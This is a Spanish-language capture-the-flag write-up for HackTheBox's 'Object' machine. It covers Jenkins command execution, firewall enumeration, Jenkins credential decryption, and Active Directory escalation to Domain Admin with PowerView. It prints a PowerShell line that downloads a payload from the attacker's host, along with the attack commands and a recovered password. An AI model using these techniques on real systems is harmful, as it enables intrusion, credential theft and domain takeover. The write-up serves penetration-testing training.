# Máquina "Object" de HackTheBox

## Características:

- Windows
- Difícil
- Active Directory
- Jenkins Exploitation (New Job + Abusing Build Periodically) 
- Jenkins Exploitation (Abusing Trigger builds remotely using TOKEN) 
- Firewall Enumeration Techniques 
- Jenkins Password Decrypt 
- BloodHound Enumeration 
- Abusing ForceChangePassword with PowerView 
- Abusing GenericWrite (Set-DomainObject - Setting Script Logon Path) 
- Abusing WriteOwner (Takeover Domain Admins Group) Active Directory

## Útil en:

- OSCP 
- OSEP 
- OSWE 
- Active Directory

**IP:** 10.10.11.132

## Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.132
```

**Resultados:**

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Mega Engines
| http-methods: 
|_  Potentially risky methods: TRACE

5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

8080/tcp open  http    Jetty 9.4.43.v20210629
|_http-server-header: Jetty(9.4.43.v20210629)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Tenemos estos puertos de los cuales 5985 es de administración remota, puerto 80 IIS (Internet Information Server) a nivel de CMS como gestor de contenido. Podemos ver un nombre de dominio object.htb, así que agregamos este nombre de dominio en `/etc/hosts`.

![Web puerto 80](/secciones/posts/imagenes/object/web80.webp)

El único enlace en la página para el servidor de "automatización" conduce a http://object.htb:8080/, una página de Jenkins.

![Jenkins página inicial](/secciones/posts/imagenes/object/jenkins1.webp)

Intentamos ingresar con credenciales por defecto sin resultados. Nos creamos una cuenta y revisamos el panel. Veremos algunas cosas útiles: versión de Jenkins, configuraciones, ejecuciones, usuarios y configurar.

## Explotación de Jenkins

Podemos hacer un proyecto de Freestyle yendo a "New Item". Después de nombrar el proyecto, se le presentarán "Build Triggers", "Build Environment", "Source Code Management", etc. 

Seleccionamos "Build Triggers" y luego "Build periodically", lo que nos permitirá crear una tarea programada que podemos configurar de manera similar a un trabajo cron. Esto comenzará a construir nuestro proyecto. Podemos configurar el trabajo para que se ejecute después de un minuto: `* * * * *`

![Build Triggers](/secciones/posts/imagenes/object/build1.webp)

A continuación, en "Build", podemos ver una opción para "Add build step" en la que podemos seleccionar "Execute Windows batch command".

![Execute Windows batch command](/secciones/posts/imagenes/object/build2.webp)

Volviendo al panel, podemos ver una compilación exitosa. En "Changes" > "Console Output" vemos que estamos ejecutando comandos como oliver.

Luego intenté ver si podía hacer ping a mi máquina desde aquí:

![Ping test](/secciones/posts/imagenes/object/ping1.webp)

Es exitoso, ahora podemos transferir nc64.exe a esta máquina.

```bash
cmd /c powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.18/nc64.exe')
```

Esto nos da como salida error "Unable to connect to the remote server". Es sospechoso y nos hace pensar que tendremos problemas para ganar acceso al sistema. Lo más lógico ahora sería enumerar reglas de firewall, ya que podemos inyectar código de otras formas, para saber si está bien securizado y no perder el tiempo.

## Enumeración del Firewall

Lanzamos:

```powershell
cmd /c powershell -c Get-NetFirewallRule -Direction Outbound -Action Block -Enabled True
```

Esto se traduce a que queremos que nos muestre aquellas reglas del tráfico saliente, aquellas reglas definidas que estén bloqueando el tráfico. Se puede apreciar que en DisplayName aparece "BlockOutboundDC". Al parecer hay reglas establecidas para impedir el tráfico saliente.

Ahora intentamos con el comando:

```powershell
cmd /c powershell -c Get-NetFirewallRule -Direction Outbound -Action Allow -Enabled True
```

"Allow" para filtrar con aquellas que estén habilitadas "conexión saliente", lo que nos da una salida bastante grande. Filtramos por ICMP4-OUT el cual está habilitado.

Deducimos que lo que respecta a tráfico saliente de traza ICMP sí acontece, así que matamos el servidor y montamos tcpdump en escucha en la interfaz tun0, escuchando trazas ICMP:

```bash
sudo tcpdump -i tun0 icmp -n
```

Efectivamente, nos llegan las trazas, así que se podría montar una reverse shell por ICMP, pero se hará con otro método usando PowerShell para mostrar nombres de reglas del firewall.

Referencia: https://itluke.online/2018/11/27/how-to-display-firewall-rule-ports-with-powershell/

Recatamos el código:

```powershell
cmd /c powershell -c "Get-NetFirewallRule -Direction Outbound -Action Block -Enabled True | Format-Table -Property Name,DisplayName,DisplayGroup,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},Enabled,Profile,Direction,Action"
```

Se muestra que todo está bloqueado. Continuamos enumerando directorios desde Jenkins:

```powershell
cmd /c powershell -c "ls ../../"
```

## Enumeración de Jenkins

No hay nada en el directorio actual, así que enumeraremos los que están en `.jenkins`. Jenkins usualmente trae archivos config.xml, directorios de usuarios con más archivos config.

```powershell
cat ../../config.xml
```

No muestra nada útil, así que revisamos usuarios:

```powershell
ls ../../users/
```

Entramos a admin, vemos su archivo config.xml y encontramos un usuario y contraseña probablemente encriptada, así que copiamos todo el archivo y lo guardamos. Luego buscamos un desencriptador de credenciales.

**Referencia:** https://github.com/hoto/jenkins-credentials-decryptor

Usamos la línea de código que dice Linux o Mac:

```bash
curl -L \
  "https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.0/jenkins-credentials-decryptor_1.2.0_$(uname -s)_$(uname -m)" \
   -o jenkins-credentials-decryptor

chmod +x jenkins-credentials-decryptor
```

Lo lanzamos y vemos una sección donde nos pide 4 archivos que son necesarios:

```bash
./jenkins-credentials-decryptor \
  -m master.key \
  -s hudson.util.Secret \
  -c credentials.xml \
  -o json
```

Así que vamos a la carpeta secrets que habíamos visto anteriormente y aquí encontramos los 2 primeros archivos. Hacemos un cat a master.key, creamos el archivo en nuestra máquina, copiamos el interior pero ojo, ya que si trae un salto de línea nos puede fallar. Así que revisamos antes:

```bash
xxd master.key
```

Vemos que sí tiene salto de línea, se los sacamos:

```bash
cat master.key | tr -d '\n' | sponge master.key
```

Se puede ver que está encodeado, así que buscamos en Google algún script de PowerShell para convertir el archivo a formato de cadena Base64. Copiamos el oneline, lo agregamos al código y lo modificamos un poco. Quedaría así:

```powershell
cmd /c powershell -c [convert]::ToBase64String((cat ../../secrets/hudson.util.Secret -Encoding byte))
```

La salida la decodificamos en el archivo hudson:

```bash
echo "gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=" | base64 -d > hudson.util.Secret
```

Listo, tenemos el archivo hudson. Con todos los archivos podemos hacer funcionar el decryptor:

```bash
./jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c config.xml
```

Nos da como salida:

```json
{
  "id": "320a60b9-1e5c-4399-8afe-44466c9cde9e",
  "password": "c1cdfun_d2434\u0003\u0003\u0003",
  "username": "oliver"
}
```

## Acceso Inicial

Luego con WinRM:

```bash
sudo evil-winrm -i 10.10.11.132 -u 'oliver' -p 'c1cdfun_d2434'
```

Listo, buscamos la flag. Según comentarios es una máquina realista. Dentro de PowerShell para ver los usuarios lanzamos:

```cmd
net user
```

Vemos a maria con privilegios de administración. Ahora como parece tener un domain controller, vamos a jugar con BloodHound.

## Enumeración con BloodHound

Iniciamos BloodHound ejecutando neo4j primero y luego la GUI de BloodHound y cargamos los archivos JSON desde el archivo zip.

![BloodHound inicial](/secciones/posts/imagenes/object/bloodhunt1.webp)

Podemos buscar el nodo Oliver y marcarlo como propio para poder buscar rutas para obtener privilegios.

![BloodHound Oliver](/secciones/posts/imagenes/object/bh2.webp)

Para enumerar vías potenciales para escalar privilegios, lanzamos en PowerShell:

```cmd
net group
```

Vemos la sección domain admin. Lanzamos:

```cmd
net user maria
```

Vemos que María forma parte de "Remote Management Users" y "Domain Admins". Luego vamos a la carpeta users, hacemos dir y nos muestra un usuario smith.

## Escalada de privilegios (Smith)

Al ejecutar la consulta de ruta más corta al administrador del dominio, podemos ver una ruta de oliver a smith en la que podemos cambiar la contraseña de smith. Así que esto sería "abusing ForceChangePassword". Además smith tiene opciones de escritura en maria y maria es propietaria del administrador de dominio.

![María en BloodHound](/secciones/posts/imagenes/object/maria1.webp)

Vamos a la consola evil-winrm con acceso y lanzamos:

```powershell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
```

Luego buscamos en Google powerview.ps1 powersploit, lo descargamos y lo pasamos a la víctima:

```powershell
upload /home/kar/maquinas/object/PowerView.ps1
```

Importamos los módulos:

```powershell
Import-Module .\PowerView.ps1
```

Luego volvemos a BloodHound y usamos la sección:

```powershell
Set-DomainUserPassword -Identity smith -AccountPassword $SecPassword
```

Lo modificamos un poco para no cargar las contraseñas ya que la habíamos generado con el comando anterior, solo modificamos $SecPassword y el nombre de usuario, el resto lo borramos, damos enter y entramos con evil-winrm:

```bash
evil-winrm -i 10.10.11.132 -u 'smith' -p 'Password123!'
```

## Escalada de privilegios (María)

Ya como smith vemos BloodHound y observamos que tiene como vulnerabilidad "GenericWrite" sobre maria. Aquí podemos ver que podemos realizar un ataque Kerberos. Vamos a usar otra forma que consiste en retocar y controlar los atributos de usuario.

En directorio activo se pueden configurar cosas ciertamente críticas. Por ejemplo, "logon script" es un script que se ejecuta cuando el usuario inicia sesión. Usaremos esta secuencia de comando modificada:

```powershell
Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
```

Sacamos credential cred, cambiamos service principal name y cargamos el archivo PowerView antes mencionado.

**Referencia:** https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

En la máquina víctima:

```powershell
Import-Module .\PowerView.ps1
```

Así que nuestro script de inicio de sesión consistiría en mostrar lo que hay dentro de maria cuando esta inicie sesión.

En vez de service principal name ponemos un script path que es para controlar el logon script. Así que vamos a definir un script en PowerShell:

```powershell
echo 'dir C:\Users\Maria\Desktop\ > C:\ProgramData\bh\output.txt' > test.ps1
```

Un script que se guardará en la secuencia de comandos antes mencionada que guardará la salida de dir en el archivo output cuando maria inicie sesión. El script quedará de esta manera:

```powershell
Set-DomainObject -Identity maria -SET @{scriptpath='C:\ProgramData\bh\test.ps1'}
```

Hacemos dir y deberíamos ver el archivo output.txt. Esto pasa gracias a que maria se está autenticando con intervalos regulares de tiempo, así que vemos el archivo engines.xls. Modificamos el script para copiar el archivo:

```powershell
echo 'copy C:\Users\Maria\Desktop\Engines.xls C:\ProgramData\bh\Engines.xls' > test.ps1
```

Lo descargamos a la máquina atacante:

```powershell
download C:\ProgramData\bh\Engines.xls Engines.xls
```

Lo abrimos con LibreOffice. En el archivo se ven 3 contraseñas, intentamos iniciar sesión con evil-winrm.

## Escalada final (Domain Admin)

Vamos al directorio que creamos una vez más y esta vez debemos ganar control en el domain admin, que ya es posible con el usuario María. Así que importamos el módulo de PowerView, modificamos nuevamente el seteado. Recordar que todo esto aparece en BloodHound:

```powershell
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity Maria
```

Este comando nos agrega al domain admin, luego nos damos todos los privilegios con:

```powershell
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights All -PrincipalIdentity Maria
```

Hacemos `net user Maria` y no nos muestra como miembros de domain admin, así que lo agregamos con:

```cmd
net group "Domain Admins" Maria /add /domain
```

Entramos y salimos para actualizar credenciales y terminamos buscando la flag de root.

---

**Nota:** Algunos de los writeups en esta página pueden tener contenido de otras páginas o tener muy pocas imágenes, esto debido a que en algunas de las máquinas que realicé, no tomé los apuntes o no tomé capturas de pantalla, así que he decidido buscar varios writeups y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí. También si encuentras faltas de ortografía o cualquier error, puedes contactarme a mi correo.